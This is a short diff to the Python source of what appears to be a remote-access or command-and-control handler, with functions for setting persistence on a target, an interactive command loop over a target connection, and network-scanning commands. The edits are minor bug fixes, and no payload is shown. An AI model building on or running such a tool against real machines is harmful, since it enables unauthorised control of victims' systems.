@@ -395,7 +395,7 @@ def getFileURL(command, targetConn):
 
 
 def tryPersistence(targetConn, cachedCommands):
-    if cachedCommands['commands']['persistence']:
+    if "persistence" in cachedCommands['commands']:
         print(f"{Y}Cached Command: {END}\n\t{cachedCommands['commands']['persistence']}")
         return
 
@@ -414,7 +414,7 @@ def tryPersistence(targetConn, cachedCommands):
 
 
 def lowPersistence(targetConn, cachedCommands):
-    if cachedCommands['commands']['lowpersistence']:
+    if "lowpersistence" in cachedCommands['commands']:
         print(f"{Y}Cached Command: {END}\n\t{cachedCommands['commands']['lowpersistence']}")
         return
 
@@ -599,7 +599,11 @@ def mainFunctions(ip, targetConn, ses):
 
         while True:
             command = session.prompt(ANSI(prompt))
-            if command == "exit":
+            if command == "":
+                targetConn.send(" ".encode())
+                print(targetConn.recv(1024).decode(), end="")
+
+            elif command == "exit":
                 closeConn(targetConn, ses)
                 break
 
@@ -664,7 +668,9 @@ def mainFunctions(ip, targetConn, ses):
             elif command == "hosts":
                 try:
                     print("\n\t", cachedCommands['commands']["scannet"], "\n")
-                except NameError:
+                except NameError :
+                    print(f"\n\t{R}[!>] {Y}Not Scanned Net....{END}\n")
+                except KeyError:
                     print(f"\n\t{R}[!>] {Y}Not Scanned Net....{END}\n")
 
             elif command.startswith("scanhost"):
